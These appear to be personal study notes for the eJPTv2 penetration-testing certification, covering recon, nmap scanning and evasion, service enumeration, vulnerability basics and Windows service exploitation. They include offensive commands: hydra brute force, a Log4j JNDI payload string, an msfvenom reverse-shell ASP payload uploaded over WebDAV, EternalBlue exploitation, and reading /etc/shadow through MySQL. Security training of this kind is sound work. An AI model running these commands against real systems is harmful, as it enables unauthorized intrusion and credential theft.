# eJPTv2-Notes



# **Information Gathering** - **Reconnaissance** (the first step) (part of Assessment Methodologies)

- Obtaining information about the target both ***actively*** and ***passively***
- **passive** ***(reconnaissance)*** - finding the ip, domain address of the target, finding subdomains, social media profiles, domain ownership information, web technologies used in the website (not engaging with the target) (finding publicly available information)
- **active** ***(enumeration)*** - port scanning of the ip address, learning internal infrastructure of the target, enumerating information (you need authorization for engaging actively with the target system)
- **footprinting** - enumeration but comprehensive

## Passive Recon

**`host** <domain name>` - finds the **ip** address of a domain name

`robots.txt` (directory in URL) - indicates which portions of the website crawlers are allowed to visit.

`sitemap.xml`(or sitemaps) - tells search engines more about a website (all directories in a website within one file)

*builtwith, wappalyzer* (firefox extensions) - web technology indicators

**`whatweb** <domain>` - web technology indicator in a terminal

`sudo apt install ***webhttrack` -*** web site installer to a local directory (httrack)

**`whois** <domain name>` - domain ownership information **(website version is also available)**

 [**netcraft.com**](http://netcraft.com) - all information about any website

### DNS RECON

**`dnsrecon** -d <domain name>` - gives information about DNS (NS, MX, etc - name and mail servers)

[**dnsdumpster.com**](http://dnsdumpster.com) - dns lookup & research (more comprehensive than `dnsrecon`)

### WAF Fingerprinting

**WAF - Web Application Firewall**

**`wafw000f** <domain name>` - WAF recon utility, used for fingerprinting web firewalls.

**`wafw00f** <domain> -a`  -  for all instances

### Subdomain Enumeration

**`sublist3r** -d <domain name>` - gives all found subdomains

**`theHarvester** -d <domain> -b <source>` - not only domains but also emails, IPs

### Google Dorks

```
site:ine.com - every domain contains ine.com and we can have **subdomains** as well (my.ine.com)
site:*.ine.com - gives fully and only **subdomains**

inurl:admin - contains "admin" in every url

****intitle:admin - contains "admin" in every title
intitle:"index of" - directory misconfigurations (a type vulnerability)

filetype:pdf - website contains files with they type of **pdf**

cache:ine.com - old (hours before) versions of website according to google

intext:admin - searches for the given word in the body of the text somewhere
```

### Email Harvesting (*subdomains*, IPs, as well)

    **`theHarvester** -d <domain name>` - searches through a domain name for finding credentials 

### Leaked passwords

[**haveibeenpwned.com](http://haveibeenpwned.com)**   - checking checking data breaches

## Active Recon

**DNS** - Domain Name System is a **protocol**, used for resolving domain names/hosts into IP addresses.

A DNS Server or a **nameserver** contains domain names and their IP addresses, DNS records as well

Public DNS Servers have been set up by Cloudflare (1.1.1.1) and Google (8.8.8.8)

### DNS Records

A - resolves hostname into an IPv4

AAAA - hostname to an IPv6

NS - domain nameserver

MX - resolves a domain to a mail server (mail exchange server)

CNAME - domain aliases

TXT - text record 

HINFO - host info (host’s hardware)

SOA - domain authority

SRV - service records

PTR - resolves an IPv4 into a hostname (domain name) (reverse DNS)

### DNS Interrogation

Involves querying DNS Servers for information (additional) about a **specific** domain. (A, NS, MX, TXT, etc)

*More specific* than DNS Enumeration 

### DNS Zone Transfer

Happens when admins transfer zone files from one DNS server to another one. If misconfigured, this can be abused by attackers. These files provide **DNS Records**, a whole view of organizations’ network layout.

### DNSENUM, dig, fierce

**`dnsenum** <domain>` - active recon tool, DNS enumerator, **zone transfer tool** (active recon tool **unlike *dnsrecon***) 

**`dig** axfr @<nameserver> <domain>`  - active recon DNS Interrogation tool

**`fierce** —domain <domain>` - DNS enumeration tool (active)

### NMAP

`sudo **nmap** -sn <ip/24>` - host scanning, no ports (finding ***devices*** in the **LAN**)

**`netdiscover`** - host discovering 

Example: `netdiscover -i eth0 -r <ip/24>`

`sudo **nmap** -Pn -p 80, 443 <ip>` - specific port scanning (-p) (tcp) and skipping host scanning (-Pn)

**filtered state** means it is protected by a **firewall** (and more likely closed)

**default scanning** is **1000** most used ports and SYN **(-sS)** scanning with -**T3** for a root user

`sudo nmap -Pn **-p1-65535** <ip>` - port range (all ports like -p-)

`sudo nmap **-F** <ip>` - **100** most used ports (-F  -  fast)

UDP scanning - `nmap **-sU** <ip>`

**s**ervice **V**ersion - `nmap -**sV** <ip>`

Operating System - `nmap -**O** <ip>` (**not reliable**)

What is happening in the background - (`nmap **-v**`) verbose

finding more info with **sC**ripts - `nmap **-sC** <ip>`

***V**ersion, **O**perating system, s**c**ript scanning together (-sV -O -sC)* - `nmap **-A** <ip>`

**(-sC -sV -O) = (-A)**

**Timing: -T<0-5>**

-T4 is ***preferred*** if the connection is fast, some ***accuracy errors*** can happen

`sudo nmap -A **-T4** -p- <ip>` - script, version, OS scan with high speed and all ports

-T4 (aggressive)

**Saving results:** 

`nmap -A -T4 -p- <ip> **-oN** results.txt` - (-oN) saves as a text file

`nmap -A -T4 -p- <ip> **-oX** results.xml` - (-oX) saves as a xml file, useful for metasploit

# Footprinting and Scanning (Networking, NMAP) (Assess. Meth.)

## Penetration Testing Methodology

1. Information Gathering - Passive and Active Recon
2. Enumeration - Service & OS Enumeration, share enumeration
3. Exploitation (Initial Access) - Vulnerability analysis & Exploitation methods
4. Post-Exploitation - Privilege Escalation, local enumeration, lateral movement
5. Reporting - Report writing, recommendations 

## OSI Model

- Hosts communicate with each other using **network protocols**. Network Protocols exits because of making sure that different hardware and software can **communicate with each other.**
- These communications via protocols are done by sending **packets**. **Packets** are streams of bits running as electric signals on physical media (Ethernet, Wi-Fi, etc).
    - Packets have ***headers*** and ***payloads***. ***Header** has protocol-specific structure (meta data), ensures that the host can interpret payload properly, while **Payload** contains actual information.*

**O**pen **S**ystems **I**nterconnection - is a conceptual framework, standardizes the functions of networking into seven layers.

![Screenshot 2024-07-21 at 18-26-26 INE-Assessment-Methodologies-Footprinting-and-Scanning-Course-File.pdf.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/5b559fd1-44a9-48a9-ace5-96e04c706280/f010e068-8fec-457c-80f6-b6bc7dd36da3/Screenshot_2024-07-21_at_18-26-26_INE-Assessment-Methodologies-Footprinting-and-Scanning-Course-File.pdf.png)

1. Physical layer - deals with physical connection of devices (Ethernet, Fiber, USB)

 6.  Data Link layer - manages access to the physical medium, provides error detection (Physical addressing) (Switches)

1. Network layer - responsible for routing (Logical Addressing) (IP, ICMP)

 4.  Transport layer - responsible for flow of control, end-to-end communication (TCP, UDP)  

1. Session layer - manages connections, handles with synchronization (APIs)

 2.  Presentation layer - translates data between application and lower layers, encrypts and compresses data (SSL/TLS, JPIG)

1. Application layer - provides network services to the end-users (HTTP, FTP, SSH) 

**TCP/IP** - TCP packet contains IP packet, because TCP requires IP. This is called **encapsulation**

### Network Layer

Responsible for **logical addressing** (IP) and **routing**, **forwarding** data packets between devices across the network as well. Its purpose is to determine an optimal path for data transferring from the ***source*** to the ***destination.***

Network Layer **Protocols** include: 

1. **IPv4** - (Internet Protocol version 4) is the *foundation* of communication on the Internet (most used version of **I**nternet **P**rotocol - 32 bits). 
    1. IP packet header contains some information such as *source & destination address*, version number, **TTL** (time to live inside of a service - for limiting hops (routers) ), and protocol (higher layer - transport).
    2. IP addressing can be **unicast** (one to one communication), **broadcast** (one to all within a subnet, ends with **.255**), **multicast** (one to many to selected group of devices)
    3. **Subnetting** - dividing a large group of IP network into subnets for efficiency and security.
    4. **Private** IP addresses are : 192.168.x.x, 172.16.x.x, 172.31.x.x. *****They shouldn’t be routed on the Internet, it is only for an internal use**.
    5. Local host: 127.0.0.0/8 (loopback addresses)
2. **IPv6 -** 128 bits
3. **ICMP** (Internet Control Message Protocol) - used for error reporting mostly **host discovery.** Contains **echo request** and **echo reply** packets for ping sweep.
4. **DHCP - (D**ynamic **H**ost **C**onfiguration **P**rotocol) Assigns IP addresses to devices that connect to the network (IP assigner).

### Transport Layer

Facilitates communication for devices across the network, ensures reliable, end-to-end connection, detects errors, **segments** data into smaller units.

Transport Layer **Protocols** include:

1. **TCP** (Transmission Control Protocol) - is a connection-oriented protocol, requires accurate delivery of data across the network through the use of ***3-way handshake***:
    1. **3-way handshake** is an establishment of connection before delivering data.
    
    ![240722_02h49m53s_screenshot.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/5b559fd1-44a9-48a9-ace5-96e04c706280/542e6723-54ac-40b0-8ce8-db624464b445/240722_02h49m53s_screenshot.png)
    
    1. Client sends SYN (Synchronize) (set) flag. Includes a initial sequence number.
    2. Server responds with SYN-ACK (Acknowledge). Includes its own initial sequence number.
    3. Client responds ACK.
        
        
         SYN
        
    
     —————> Initiates a connection request
    
       SYN-ACK
    
    <————— Acknowledges the connection request (SYN), ACKs the received data (ACK)
    

             ACK

        —————> No acknowledgment yet.

b. **TCP Port numbers:**

- Well-known ports: (0-1023). 21-FTP, 22-SSH, 23-telnet, 53-DNS, 80-HTTP, 25-SMTP (Simple Mail Transfer Protocol), 443-HTTPS, 445-SMB
- Registered ports: (1024-49151) 3306-MySQL, 3389-RDP (Remote Desktop Protocol)

`netstat -antp` - TCP connections

1. UDP - (User Datagram Protocol): used for connectionless and fast delivery of data. UDP does not establish a connection before the delivery of data. UDP is also unreliable which means data delivery is not accurate because he doesn’t establish a connection.
    1. UDP is used in real-time applications like Skype, games, VoIP, etc. (low latency is crucial).

## Network Mapping

After passive recon, pentester does a network mapping (for the network infrastructure of a company). This includes host discovery, port scanning, version scanning, OS fingerprinting (for detecting vulnerabilities later)

### Host Discovery

Techniques:

1. Ping Sweeps (**ICMP** Echo Requests, **ICMP** Echo Replies): Echo request - Type:8, Code:0    Echo Reply: Type:0, Code:0 (request and response code)
2. ARP (Address Resolution Protocol): Discovers hosts based on their **MAC** addresses in the same broadcast
3. TCP SYN (Half-Open Scan): Sends SYN packet, then a host responds with SYN-ACK, client responds with RST
4. TCP ACK: Expects no response. If gets RST, it means unfiltered or closed
5. UDP Ping: Sends UDP packets, if a host does not respond to TCP and ICMP Echo requests.

**NOTE:**

*****ICMP** requests are blocked (by **Windows** Firewalls), then using **TCP SYN** is more considerable, but **TCP SYN** may not be responded.

### **2>/dev/null** - ignores errors

1. Ping Sweep with **`fping`**:     **`fping -a -g <ip/24> 2>/dev/null`- (-a (alive), -g (subnet))**
    1. **NOTE: `ping` and `fping` are completely blocked by Windows Firewall , you must use *TCP SYN* SCAN**
2. `nmap -sn -**iL** targets.txt` - **i**nput **F**ile name that contains ip addresses
    
    targets.txt: 192.168.1.0
    
    192.168.1.1
    
    192.168.1.2-254 # range
    
3. `nmap -sn **-PS** <ip/24>` - ping scanning with **TCP SYN (good against Windows hosts)**
    
    `nmap -sn -PS**80, 443, 443-1000** <ip/24>` - with port range, **TCP SYN** Scan
    
4. `nmap -sn -**PA**80-443 <ip/24>` - **TCP ACK** scanning (not **preferred**)
5. `nmap -sn -**PE** <ip/24>` - ICMP **Echo** request
6. `nmap -sn -**PU** <ip/24>` - **UDP** ping scanning

### Port Scanning

**`-sS`** and **`-sT`** difference:

`-**sS**` (SYN Stealth Scan) - used for discovering open ports. Sends **SYN** packet, then server responds with **SYN-ACK**, and client sends **RST** packet that it makes `-sS` stealthy 

**`-sT`** (TCP Connect Scan) - used for discovering open ports. Sends **SYN**, gets **SYN-ACK**, sends **ACK** again.

**NOTE: ***Default value for port scanning without Privileges is `-sT` as an ordinary user,**

**with privileges is `-sS` as a root user**

### Service Version and OS Scanning:

1. `nmap -**sV** -**O** <ip>`
2. `nmap -sV **—version-intensity <0-9>** -O **—osscan-guess** <ip>`  - Version intensity increases **aggressiveness** of service version detection, Osscan-guess guesses OS more **aggressively.**

### NSE (NMAP Scripting Engine)

**NSE** is used for writing and sharing helpful scripts for automating a wide variety of tasks. (developed in LUA)

Directory for NSE: `ls /usr/share/nmap/scripts`

For your wants: `ls /usr/share/nmap/scripts | grep brute` - scripts for brute force

**—Information about scripts**: `nmap **—script-help**=mongodb-databases`

**—Using Scripts:** `nmap **—script**=http-form-brute**,**http-enum <ip>`  **(after comma without space)**

Using **entire** scripts of a service with a wildcard: `nmap —script=**ftp-*** -p21 <ip>`

**—Script Arguments: `nmap —script=smb-enum-sessions —script-args smbusername=username,smbpassword=password`**

**-A (Aggressive Scan)**

### Firewall Detection & IDS Evasion in NMAP

- **Firewall** Detection: `nmap -**sA** -p 3389 (RDP Port) <ip>` - we use ports that are associated with **Windows**
    
    If it is protected by Firewall, then we’ll se **filtered** station, if it is not then it is **unfiltered.**
    
    **Note**: ***When we send ACK packet to a ports, that ports does not respond, it means port is **filtered**, if responds with RST, then port is **unfiltered**
    
- **IDS** (Intrusion Detection System): `nmap **-f** **--mtu** 32 <ip>`
    - **`-f**` means **fragmentation** (a packet is broken to smaller pieces, `—mtu` means **M**aximum **T**ransmission **U**nit refers to the highest value of a packet in bytes.
    - These fragmentation makes it **harder** to be detected by IDS/IPS
- **Spoofing:** `nmap -f —data-length 200 **-D** 10.23.21.1,10.23.21.2 **-g** 53 <ip>` - We use a decoy ip address and a port to fool IDS/IPS
    
    `-D` as decoy, `-g` as a source port
    

### Optimization

- `—host-timeout 2s` - after 2 seconds, **host discovery is finished**
- `—scan-delay 3s` - every 3 seconds, one **packet is sent**

### Output Formats

- `-oN` - normal (text file)
- `-oX` - xml file for metasploit or other apps
- `-oG` - grepable

Zenmap - GUI version of NMAP, has some features like topology, etc.

**NOTE: IF a host does not have expected ports, then perform ****UDP* Scan**

# Enumeration (Assess. Meth.)

**Server** is a thing that does some functionality, in terms of computers, a server **provides resources** to other computers, a server can be any computer.

**Malicious** access can also be performed by adversaries, because of bugs, **vulnerabilities**, etc.

## SMB (Server Message Block)

SMB is a communication protocol used for sharing files, printers, etc between Windows hosts.

Default port is **445**, but before it operated on NetBIOS, port **139. (137/udp, 138/udp as well)**

Windows *commands* for **SMB**:

File Explorer → Network → Map Network → \\<ip>\ → Browse

- `net use * /DELETE` - disconnects with all connections in SMB
- `net use Z: \\10.5.20.106\c$ /user:<username> <password>` - reconnecting

### SMB Enumeration

- **Nmap** scripts like `smb-ls`, `smb-enum-sessions`, `smb-enum-users`, `smb-ls`, `smb-os-discovery`, **etc**. (for help, `—script-help=smb-enum-users`), `—script-args smbusername=user,smbpassword=password`
- SMBMap: `smbmap -u <username> -p <password> -d <directory> -H <target ip>`  - finds **Shares (**`-u guest -p “” -d .` **)**
    - RCE (Remote Code Execution):`smbmap -u <user> -p <password> **-x <windows_command>** -H <target>` - (providing with a command **`-x`**) (`-x ipconfig`)
    - Listing drives with **`-L`**
    - Inside of Drive with **`-r <drive>`** - as an example, `-r c$`
    - File Uploading: `smbmap -u <user> -p <password> -H <target> **—upload** /root/file c$/file`
    - File Downloading: `smbmap -u <user> -p <password> -H <target> **—download** c$/file` (c$ - C: Drive)
- **nmblookup:`nmblookup** -A <ip>` - querying NetBIOS names
    - **SAMBA** is an open-source implementation of SMB
- **rpcclient**: **`rpcclient** -U “” -N <ip>`  - (`-U` - username, `-N` - no password)
    - After access, `srvinfo` - server info about SAMBA
    - `enumdomusers` - user list
    - `lookupnames <name>`
- **smbclient**:**`smbclient** -L <ip> -N` - listing Shares, `-L`=lists by ip, `-N`=no password
- **enum4linux**: **`enum4linux** -a <ip>` (`-a`- all simple enumeration)
    - `enum4linux -U <ip>` - user list
    - `enum4linux -o <ip>` - OS information

### SMB Client

- `smbclient //<ip>/<share_name> -N -U <username>` - connects to SMB with no password (`-N`)

Dictionary attack with Hydra:

- `hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://192.243.20.3`

`unzip <file>` - unzipping

`gzip -d <file.gz>` - decompressing

`tar -xf <file.tar>` - for un-tarring :)

## FTP (File Transfer Protocol)

**`ftp** <ip>` - for accessing ftp server, then you enter a username and password

- FTP password brute force with nmap: `nmap -p 21 —script=ftp-brute —script-args userdb=user.txt,passdb=pass.txt <target>`
- If anonymous login is allowed: **username**=**anonymous**, **password**=”” (`-sC` gives it because of **`—ftp-anon`** script)

## SSH (Secure Shel)

Used for operating network services **securely** over an unsecured network.

Access: `ssh <username>@<ip>` 

`nc <ip> 22` (version of SSH)

NMAP Scripts

- `—script=ssh2-enum-algos` - gives encryption algorithms
- `—script=ssh-hostkey —script-args ssh_hostkey=full` - hostkeys
- `—script=ssh-auth-methods —scrpt-args=ssh.user=<username>` - authentication methods for specific users (sometimes it is none, so we don’t need any password)

SSH Brute force with NMAP

- `nmap -p 22 —script=ssh-brute —script-args=userdb=users.txt,passdb=pass.txt <ip>`

## HTTP (HyperText Transfer Protocol)

**`http** <ip or domain>` - Gives the page source and connection type, etc of a website (the tool is called **httpie**). 

**`dirb** http://<ip> /usr/share/wordlists/…` - web content scanner (**directory** brute-forcing). dirb has its own default wordlist

`browsh —startup-url http://<ip>` - CLI based websites

`lynx http://<ip>` - similar with browsh, but good for **parsing**

Nmap Scripts:

- `nmap —script=http-enum -p 80 <ip>` - HTTP enumeration with directory brute-forcing
- `nmap —script=http-headers -p 80 <ip>`- HTTP headers
- `nmap —script=http-methods —script-args=http-methods.url-path=/<directory> -p 80 <ip>` - Gives HTTP methods (GET, POST, etc) for a given **directory**
- `nmap —script=http-webdav-scan —script-args=http-methods.url-path=/<directory> -p 80 <ip>` - detecting webdav

**`wget** http://<ip>/index.html` - downloads the web page source

**`curl** http://<ip>` - downloads the web page source

## MySQL

MySQL is DBMS (database management system) used for managing data in the SQL language

`mysql -h <ip> -u <username>` (`-u root` must be checked, `-p <password>` if needed)

After accessing:

- `show databases;`
- `use <database_name>;` - selecting a database
- `select load_file(”/etc/shadow”);`- loading files

`mysql_writable_dirs`,  `mysql_hashdump`, `mysql_file_enum` - 3 useful **metasploit** modules

Nmap Scripts:

- `nmap --script=mysql-empty-password -p 3306 <ip>` - gives **users** that have empty passwords
- `nmap --script=mysql-info -p 3306 <ip>`
- `nmap --script=mysql-users —script-args=mysqluser=<user>,mysqlpass=<password> -p 3306 <ip>` - gives users
- `nmap --script=mysql-databases —script-args=mysqluser=<user>,mysqlpass=<password> -p 3306 <ip>` - gives databases
- `nmap --script=mysql-variables —script-args=mysqluser=<user>,mysqlpass=<password> -p 3306 <ip>` - gives variables
- `nmap —script=mysql-audit —script-args=mysql-audit.username=<user>,mysql-audit.password=<pass>,mysql-audit.filename=/usr/share/nmap/nselib/data/mysql-cis.audit -p 3306 <ip>`
- `nmap --script=mysql-dump-hashes —script-args=username=<user>,password=<password> -p 3306 <ip>`

We use arguments for more **access**

A hash example: $6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/

- **First** $ indicates a hash algorithm
- **Second** $ indicates a salt for a hash
- **Third** $ is the actual hash
- Actual hash must be sent **without** a $ sign

### MSSQL

Nmap Scripts:

- `nmap —script=ms-sql-info -p 1433 <ip>`
- `nmap —script=ms-sql-ntlm-info --script-args=mssql.instance-port=1433 -p 1433 <ip>`
- `nmap —script=ms-sql-brute --script-args=userdb=<user_list>,passdb=<pass_list> -p 1433 <ip>`
- `nmap —script=ms-sql-empty-password -p 1433 <ip>`
- `nmap —script=ms-sql-query --script-args=mssql.username=username,mssql.password=password,ms-sql-query.query=<query> -p 1433 <ip>`
- `nmap --script=ms-sql-dump-hashes —script-args=mssql.username=<user>,mssql.password=<password> -p 1433 <ip>`
- `nmap —script=ms-sql-xp-cmdshell —script-args=mssql.username=<username>,mssql.password=<password>,ms-sql-xp-cmdshell.cmd=<windows_command> -p1433 <ip>`

Metasploit modules:

- `mssql_login`, `mssql_enum`, `mssql_enum_sql_logins`, `mssql_exec` (RCE), `mssql_enum_domain_accounts`

# Vulnerability Assessment (Assess. Meth)

A ***vulnerability*** - is a weakness or flow that can be found in a system, application, or network, when is exploited, results negatively, that impacts CIA triad.

Can be found by DevSecOps, Security Researchers, Pentesters, Developers, and even by users.

**CVE** - Common Vulnerabilities and Exposures, a reference method for **publicly** know vulnerabilities and exposures. Operated by MITRE.

- CVE Identifiers: CVE Numbers, IDs, Names, or CVEs, represent the **same** thing.

**NVD** - National Vulnerability Database extends CVEs with additional information. **Repository of vulnerability management data**. Provided by NIST (National Institute of Standards and Technology)

Descriptions:

- Severity (CVSS - Common Vulnerability Scoring System)
- References
- Weakness Enumeration
- Known Affected
Software Configurations

**Zero-Day Vulnerability** - is a vulnerability that is **unknown** to the vendor and has no found exploits.

### CIA Triad

CIA Triad is an important model to guide us policies for InfoSec within an organization.

- **C**onfidentiality - it means that only **authorized** individuals/systems can view sensitive or classified information. When is data is sent over the network, unauthenticated individuals mustn’t get access.
- **I**ntegrity - making sure that data has not been **modified or corrupted**
- **A**vailability - it means that the network should be readily **available** to its users, backup is important

Methods for finding vulnerabilities:

- Scanning - Nessus
- Research - Exploit-db
- Fuzzing (input-output)

## Well-known vulnerabilities

1. **Heartbleed** - Reviewing Heartbleed in [cve.mitre.org](http://cve.mitre.org) and [nvd.nist.gov](http://nvd.nist.gov) (Bug in OpenSSL 1.0.1, leaks information from memory) - **Memory Disclosure (Layer 7 vuln)**
    1. Nmap Scripts:
        1. `—script=ssl-enum-ciphers` (for SSL enumeration)
        2. `—script=ssl-heartbleed` (checks if vulnerable)
    2. Exploit-db:
        1. Searching heartbleed in the search bar
2. How does it work?
    1. A user sends a packet with its corresponding **length** number, but the server doesn’t check if the length is true. Then, user sends a packet with an **exaggerated** number of length, and the server responds by sending back the payload with **additional information** from its memory up to the previously specified length number, which can include usernames, passwords, etc.

1. **EternalBlue** - Bug in SMBv1 (RCE happens by sending specially crafted packets (buffer overflow) to SMBv1). RCE happens through a buffer overflow. - **RCE preceded by buffer overflow (Layer 4 vuln)**
    1. Nmap Scripts:
        1. `—script=smb-vuln-ms17-010`
    2. Exploit-db:
        1. Searching eternalblue in the search bar
2. How does it work?
    1. We send SMB packets to the Server with a payload (contains reverse shell), and buffer overflow allows us to execute RCE.

1. **Log4j** - Vulnerability in Apache log4j logging library, allows **RCE** because of JNDI lookup
    1. Nmap Scripts:
        1. `—script=log4shell` (must be installed from GitHub)
    2. ${jndi:ldap://demo.ine:1389/mycode}
        1. JNDI (Java Naming and Directory Interface) provokes LDAP (Lightweight Directory Application Protocol) to search for mycode

### ****Nessus* (Vulnerability Scanner)

My Scans → New Scan → Choosing a Template (Mostly, Web Application Tests Scan) → Launch

Nessus has variety of scan templates that gives us vulnerabilities, service detection, etc.

Generating a report:

- Report (in vulnerabilities page) → Selecting a report template  → Generate a Report → Save File

# Auditing Fundamentals (Assess. Meth or Network & Host Auditing)

### Compliance

In cybersecurity, **compliance** refers to the adherence to laws, regulations, guidelines, and specifications relevant to the organization's operations.

- PCI DSS - Payment Card Industry Data Security Standard
- HIPAA - Health Insurance Portability and Accountability Act of 1996
- GDPR - General Data Protection Regulation (EU)
- CPPA - California Consumer Privacy Act
- SOX - Sarbaney-Oxley Act of 2002

### Frameworks

Models that are used for guiding an organization in improving their security posture.

- ISO/IEC 27000 - ISO/International Electrotechnical Comission
    - Covering more than just privacy, confidentiality and IT/technical/cybersecurity issues
    - Applicable to organizations of all shapes and size
    
    ISO 27001
    
    ~ Information technology — Security Techniques — Information security management systems — Requirements
    
    ISO/IEC 27002
    
    ~ Code of practice for information security controls
    
- COBIT - Control Objectives for Information and Related Technologies
    - Created by ISACA for IT management and business focus
- NIST 800-53B
    - Catalog for all U.S federal information systems
- CIS - Center for Internet Security
    - Created for mitigating most widespread cyber-attacks
- CMMC - Cybersecurity Maturity Model Certification
    - A training, certification, and third party assessment program of cybersecurity in the United States government Defense Industrial Base
- ASD - Australian Cyber Security Centre Essential Eight Maturity Model
    - Help organisations protect themselves against various cyber threats (for WIndows)

**Cyber maturity** refers to an organization’s level of sophistication and effectiveness in managing cybersecurity risks.

### Auditing

**Auditing:**

Systematic evaluation and examination of an organization’s information systems.

**Process of Cybersecurity Auditing:**

1. **Planning**: Defining the scope, objectives, and criteria of the audit, and identifying the systems, processes, and controls to be evaluated.
2. **Data Collection**: Gathering relevant information through interviews, document reviews, system inspections, and technical assessments.
3. **Evaluation**: Assessing the collected data against established criteria, policies, and standards to identify gaps and weaknesses.
4. **Reporting**: Documenting the findings, including identified vulnerabilities, compliance issues, and recommendations for improvement.
5. **Follow-up**: Ensuring that corrective actions are implemented and assessing their effectiveness in addressing the identified issues.

**Penetrating** testing **isn’t done** during an audit.

*****Reporting** is the most important part of a penetration testing.

# System/Host based attacks (Host & Network Penetration Testing)

**System/Host** based attacks are attacks that after getting access to a target host beginning to identify and exploit misconfigurations and inherent vulnerabilities (services, file systems, etc.) within a target **OS** (Windows & Linux). It requires to know target OSs and inherent vulnerabilities of them.

Some types of Windows **vulnerabilities**:

- Information Disclosure - a vulnerability that causes an attacker to access to sensitive data
- Buffer Overflows - a programming error causes attackers to write data to a buffer and overrun the allocated buffer
- RCE (Remote Code Execution) - a vulnerability that causes an attacker to remotely execute code on the target system
- Privilege Escalation - a vulnerability that causes an attacker to elevate his privileges
- DOS (Denial-of-Service) - a vulnerability that causes an attacker to consume CPU, RAM, Network, etc of a target system for preventing functioning normally

Windows is also vulnerable to cross platform vulnerabilities like SQLi

## Exploiting Windows Services

| Microsoft **IIS** (Internet Information Services) | 80/443/TCP | Windows web server by Microsoft (proprietary) |
| --- | --- | --- |
| WebDAV (Web-based Distributed Authoring & Versioning) | 80/443/TCP | HTTP Extension which allows a web server to act as a file server (deleting, uploading, copying files) |
| SMB (Server Message Block) | 445/TCP | Network resource sharing protocol (files, peripherals, etc) |
| RDP (Remote Desktop Protocol) | 3389/TCP | GUI tool for remotely interacting with a Windows host by Microsoft (proprietary) |
| WinRM (Windows Remote Management Protocol) | 5985/5986/TCP | CLI tool for remote accessing to Windows host (for automating, scripting) |

### Exploiting WebDAV on top IIS

**Microsoft IIS** is a web server that was developed by Microsoft, it is used for hosting websites/web apps. It provides us with robust a GUI for managing websites developed in ASP.NET and PHP

Extensions: .asp | .aspx | .config | .php  

**WebDAV** is an HTTP extension that allows users to collabrotively edit and manage files. It runs on top IIS.

For connecting to a WebDAV server, we must provide credentials (username & password) HTTP-GET

### Exploiting WebDAV:

- Performing brute-force attack for credentials
- After getting access, we upload malicious .asp payload. ( we find the types of payloads with `davtest`)
- NMAP Script:
    - `—script=http-enum` for finding the **directory** of WebDAV
- Brute-force with **hydra**:
    - `hydra -L <users.txt> -P <passwords.txt> <ip> http-get /webdav/` or `hydra -L <users.txt> -P <passwords.txt> http-get://<ip> /webdav/`

### Tools:

- **`davtest` -** says that which types of files can be executed
    - `davtest -auth <user>:<password> -url <url>/webdav/` - creates one directory and different test files, then uploads and executes them to the /webdav/ for checking which extensions (.php | .txt | etc) can be executed
- **`cadaver` -** used for uploading files to /webdav/
    - `cadaver <url>/webdav/` - then we enter username & password
        - `put /usr/share/webshells/asp/webshell.asp` - uploading an .asp shell (provides us with a shell **bar**)
        - `delete webshell.asp` - we can delete after completing

- **with** `msfconsole` and `msfvenom` (Metasploit)
    - .asp payload - **`msfvenom** -p windows/meterpreter/reverse_tcp LHOST=<local ip> LPORT=1234 -f asp > shell.asp`
        - `cadaver <url>/webdav/`
            - `put /root/shell.asp`
                - `service postgresql start && msfconsole -q` - database for a listener of metasploit
                    - `use multi/handler` - listener for our payload (like `nc -nlvp`)
                        - `set payload windows/meterpreter/reverse_tcp` (multi/handler must know that with which payload he is dealing)
                            - `set LHOST <local ip>` and `set LPORT 1234` (payload options - they must be the **same** as they were in **`msfvenom`**)
                            - then we click our shell.asp in <url>/webdav/ in a browser - for making our handler work
                                - our payload **works**, we can check it with`sysinfo`, `getuid` - after meterpreter session success
- we can `use exploit/windows/iis/iis_webdav_upload_asp` in Metasploit
    - setting RHOSTS, HttpUsername, HttpPassword
    - `set PATH /webdav/metasploit.asp`
    

### Exploiting SMB with PsExec

SMB (Server Message Block) is used for sharing network resources like files, peripherals, etc, between Windows hosts (445/TCP). SAMBA is open-source implementation of SMB on Linux, allows Windows hosts to access Linux shares and devices.

SMB have 2 layers of authentication:

- User authentication: username & password for accessing a share
- Share authentication: a **password** for accessing a restricted share

![240802_17h37m09s_screenshot.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/5b559fd1-44a9-48a9-ace5-96e04c706280/ab21e406-fa30-4369-a24f-efbd9883f6ae/240802_17h37m09s_screenshot.png)

**PsExec** is telnet-replacement lightweight tool by Microsoft. Used for interacting (arbitrary commands) with remote Windows hosts via **SMB (smb credentials needed)**

**Exploitation** of SMB:

- credentials gathering: **`smb_login`** in Metasploit or `hydra`
- using PsExec: [`psexec.py`](http://psexec.py)- pyhton implementation of PsExec
    - [`psexec.py](http://psexec.py) username@<ip>` - then we enter the **password** like in SSH, we get a command session
- using PsExec in **Metasploit**: `smb/psexec` exploit module

### EternalBlue (MS17-010/CVE-2017-0144)

**SMBv1** service on Windows hosts are vulnerable to **RCE**. Attackers send specially crafted packets to the server, those packets include payloads and malformed packets, buffer overlow happpens, and payloads are executed, which causes **RCE because of sent payloads.** Attackers can access the server and the network that the server is a part of. EternalBlue is an exploit name.

**Exploitation**:

- Nmap script for checking: nmap `—script=smb-vuln-ms17-010`
- using AutoBlue tool (from GitHub)
    - first we generate a reverse_tcp **shell** with `./shell_prep.sh` in **/shellcode**
        - then listener: `nc -nlvp 1234`
            - then `python3 eternalblue_exploit10.py <target ip> shellcode/sc_x64.bin` - for exploiting
                - then we get a **meterpreter** session in netcat

OR 

- `msfconsole -q`
    - we can use `smb/ms17_010_eternalblue` exploit module
        - `set RHOSTS <target ip>` and `run`

**—No Credentials Needeed—**

### Exploiting RDP

RDP (Remote Desktop Protocol) - a GUI protocol, used for accessing remote Windows hosts. (3389/TCP)

*******The default port for RDP can be changed, when we see a Microsoft service without a blank version, it is possible that this can be **RDP.**

RDP requires a username and a password for authentication

Exploitation:

- `rdp_scanner` module in Metasploit for checking if a server runs RDP
    - `set RHOSTS`
- credential brute-forcing: `hydra -L <usernames.txt> -P <passwords.txt> rdp://<ip>:<port>/`
- `xfreerdp /u:<username> /p:<password> /v:<ip>:<port>` - connecting to RDP (if a port is different, we can use `:<port>`)

### Exploiting BlueKeep (CVE-2019-0708)

